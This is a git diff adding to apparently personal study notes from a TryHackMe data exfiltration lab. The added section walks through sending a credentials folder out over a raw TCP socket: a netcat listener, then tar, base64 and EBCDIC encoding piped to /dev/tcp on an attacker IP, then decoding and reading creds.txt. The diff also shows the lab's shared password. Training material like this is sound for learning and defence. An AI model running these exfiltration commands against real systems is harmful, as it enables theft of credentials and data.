@@ -13,4 +13,32 @@ password: tryhackme
 -Data Exfiltration: unauthorized copy and export of data from inside an organization to the outside
 1. traditional: attacker -> server <-- firewall <-- data ( one direction_
 2. c2: establish a channel to send commands and receive responses from victim machine
-3. tunneling: establish communication channel b/n victim and attacker - continnueous traffic
+3. tunneling: establish communication channel b/n victim and attacker - continueous traffic
+
+-----------------------------------------------------------------------------
+
+Exfiltration using TCP Socket
+-easy to detect
+-encode data during transmission (harder to examine)
+
+ssh thm@[IP]
+tryhackme
+
+thm@jump-box nc -lvp 8080 > /tmp/task4-creds.data
+
+thm@jump-box ssh thm@vicitm1.thm.com
+tryhackme
+
+tar zcf -task4/ | base64 | dd conv=ebcdic > /dev/tcp[AttackIP]/8080
+
+thm@jump-box cd /tmp
+thm@jump-box /tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
+thm@jump-box tar xvf task4-creds.tar
+thm@jump-box cat task4/creds.txt
+
+*Exfiltration using TCP sockets relies on non-standard protocols
+
+-----------------------------------------------------------------------------------------
+
+Exfiltration using SSH
+-establishes a secure channel to interact and move data between client and server
